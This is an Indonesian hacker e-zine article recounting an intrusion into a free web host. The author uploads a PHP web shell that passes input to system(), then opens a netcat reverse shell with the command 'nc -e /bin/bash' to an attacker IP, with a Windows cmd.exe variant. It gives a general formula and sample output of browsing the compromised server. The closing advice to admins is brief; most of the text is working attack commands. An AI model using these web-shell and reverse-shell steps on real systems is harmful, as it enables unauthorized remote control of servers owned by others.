@@ -1,0 +1,195 @@
+    
+  
+        ____________________   ___ ___ ________   
+       --\_   _____/\_   ___ \ /   |   \\_____  \--
+	 -|    __)_ /    \  \//    ~    \/   |   \--
+	 -|        \\     \___\    Y    /    |    \--
+	-/_______  / \______  /\___|_  /\_______  /-
+	 -      -\/        -\/      -\/        -\/- 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE 09
+
+Author: az001 || az001@corenets.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+== REMOTE "BACKSHELL" dengan NETCAT  ==
+
+
+
+ Setelah membaca tulisan Teknik Remote Connect-Back Shell Om the_day
+ saya langsung tertarik untuk langsung mencobanya karena kebetulan
+ permasalahan yang dihadapi ternyata sama dengan Om the_day.
+
+ Saya mencoba dulu dirumah untuk memastikan apakah benar remote backshell
+ itu berjalan baik, dan ternyata benar teknik itu berjalan baik. 
+
+ Setelah itu saya langsung "mengunjungi" situs gratisan saya ,lalu saya upload
+ script php :
+
+ == sh.php ===
+ <?
+ $sh = system($sh);
+ ?>
+
+ Dan setelah itu saya mencoba menjalankannya dan berhasil
+
+ Karena kalau menjalankan shell dari script php tidak "leluasa" maka
+ Setelah itu saya upload script connect.pl dari bosen.net, dan menjalankannya 
+
+ tapi ternyata
+
+ ..hik..hik..hik
+
+ TIDAK JALAN ....
+
+ Mengapa ? , karena di server tersebut user gratisan tidak diizinkan untuk mengakses PERL ....
+
+ Stress .....? , Iya
+
+ Namun ternyata keberuntungan berpihak pada saya .., seviour mengontak saya dari kantor
+
+ [Yahoo Messenger ]
+
+ seviour> Woii
+ az001>Woii
+ seviour> Ngapain lu
+ az001>Lagi iseng nih,tapi sial ...
+ seviour>Sial kenapa ?
+ az001>Teknik remotebs gak bisa dipake, nggak ada PERLnya
+ seviour>Ooooo, itu mah gampang 
+ az001>Gimana ?
+ seviour>NETCAT !!!
+ az001>Sial, kok gw lupa yach
+
+
+ Ternyata saya melupakan sesuatu, iya .. NETCAT , tools paling ampuh di dunia saat ini
+ bisa dipakai untuk itu.
+ Tapi ada nggak ya ....
+
+
+ #whereis nc
+ nc: /usr/local/bin/
+
+ ternyata ada  ...
+
+ Langsung saya menjalankan netcat tersebut ...
+
+ ==================================================================================================
+ Ini adalah langkahnya diurutkan dari langkah yang pertama :
+
+
+
+ [Attacker]
+
+ c:\> nc -v -n -l -p 42001
+ listening on [any] 42001 ...
+
+
+ [Victim]
+
+ nc -e /bin/bash 141.118.0.1 42001
+
+
+ [Attacker]
+
+ C:\>nc -v -n -l -p 42001
+ listening on [any] 42001 ...
+ connect to [141.118.0.1] from (UNKNOWN) [141.118.0.2] 1036
+
+
+
+ Setelah Attacker menerima pesan yang kurang lebih adalah
+ "connect to [141.118.0.1] from (UNKNOWN) [202..100.10.20] 1036"
+ ,maka setelah itu si attacker dapat menuliskan command linux.
+
+ Misal:
+
+ [Attacker]
+
+ C:\>nc -v -n -l -p 42001
+ listening on [any] 42001 ...
+ connect to [141.118.0.1] from (UNKNOWN) [141.118.0.2] 1036
+ ls /boot
+ System.map@             initrd-2.4.18-6mdk.img  lilo-text/
+ System.map-2.4.18-6mdk  initrd.img@             map
+ boot.0800               kernel.h@               mbr.b
+ boot.b@                 kernel.h-2.4.18-6mdk    message@
+ chain.b                 lilo@                   os2_d.b
+ config@                 lilo-bmp/               us-latin1.klt
+ config-2.4.18-6mdk      lilo-graphic/           vmlinuz@
+ grub/                   lilo-menu/              vmlinuz-2.4.18-6mdk
+
+
+
+ Rumus Umum =>
+
+ Attacker :
+
+  nc -v -n -l -p [port yang digunakan]
+
+
+ Victim :
+
+ nc -e [Shell yang akan digunakan] [IP Attacker] [port yg di gunakan attacker]
+
+
+
+ Note : Dengan asumsi IP 141.118.0.1 adalah IP Public
+
+ Kalau target windows :
+ [Attacker]
+ Langkahnya Sama
+
+ [Victim]
+ nc -e cmd.exe [ip attacker] [port yang digunakan attacker]
+
+===================================================================================================EOF
+
+
+ Bingung memahami tulisan diatas :
+ Kunjungi www.corenets.net => Download videonya
+ 
+ Yang membuat saya bingung dan harus menjadi perhatian kita semua adalah ...
+ 
+ - KENAPA Option DGAPING_SECURITY_HOLE diaktifkan
+ - Jika 'terpaksa' menginstall netcat dan mengaktifkan Option itu, kenapa Si admin waktu mengompile
+   netcat menggunakan :
+
+   make install 
+
+ - Kenapa dia memberi izin kepada user (apache dalam hal ini) untuk mengakses netcat
+
+
+
+ Saya mungkin dapat menjawabnya dengan :
+
+ "Mungkin gw adalah seorang yang sangat beruntung di dunia ini "
+
+ atau :
+
+
+ "Mungkin adminnya sedang belajar menginstall ?" => ????????
+
+
+
+ Tulisan ini dibuat agar para "Admin" di luar sana berhati-hati dalam "menginstall" suatu aplikasi tertentu
+ yang dapat "membahayakan" .
+
+
+
+
+ Referensi :
+ - http://www.corenets.net       
+ - Remote BackShell , Author: the_day 
+ - # man netcat          
+ - google.com
+
+
+ *greetz to: 
+ 	   Seviour,langithitam,ilmuhitam,dhanjani, pembaca, dan tidak ketinggalan pula
+           echo staff yang telah memberi tempat untuk artikel saya.
+        
+           kirimkan kritik && saran ke az001@plasa.com.
+
